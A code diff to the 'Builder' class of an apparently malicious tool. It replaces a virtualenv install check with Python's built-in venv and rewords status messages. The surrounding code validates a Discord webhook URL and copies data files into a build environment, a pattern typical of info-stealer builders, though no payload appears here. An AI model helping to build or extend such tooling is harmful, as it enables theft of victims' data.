@@ -78,17 +78,6 @@ class Builder:
 		def format1(title, description= ""):
 			return f"[{title}\u001b[0m] \u001b[37;1m{description}\u001b[0m"
 
-		def checkmodules():
-			code = subprocess.run("virtualenv --version", capture_output= True, shell= True).returncode
-			if code != 0:
-				clear()
-				print(format1("\u001b[33;1mInstalling virtualenv...") + "\n")
-				os.system("pip install --quiet --upgrade virtualenv")
-				code = subprocess.run("virtualenv --version", capture_output= True, shell= True).returncode
-				if code != 0:
-					print(format("\u001b[31;1mERROR", "A fatal issue is there with your python installation. Unable to access virtualenv. Try to reinstall Python to fix this issue."))
-					exit(1)
-
 		if not hook.startswith(("http://discord.com/api/webhooks/", "https://discord.com/api/webhooks/")):
 			messagebox.showerror("Invalid Webhook", "The discord webhook you entered is invalid!")
 			return
@@ -99,16 +88,13 @@ class Builder:
 		self.root.destroy()
 		ToggleConsole(True)
 		clear()
-		print(format1("\u001b[33;1mINFO", "Checking modules..."))
-		checkmodules()
-		clear()
 
 		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
-			if not os.path.isdir(os.path.join(os.path.dirname(__file__), "env", "Scripts")):
-				print(format1("\u001b[33;1mINFO", "Creating virtualenv... (might take some time)"))
-				subprocess.run("virtualenv env", capture_output= True, shell= True)
+			if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
+				print(format1("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
+				subprocess.run("python -m venv env", capture_output= True, shell= True)
 				clear()
-			print(format1("\u001b[33;1mINFO", "Copying assets to virtualenv"))
+			print(format1("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
 			for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Data")):
 				if os.path.isfile(fileloc := os.path.join(datadir, i)):
 					shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
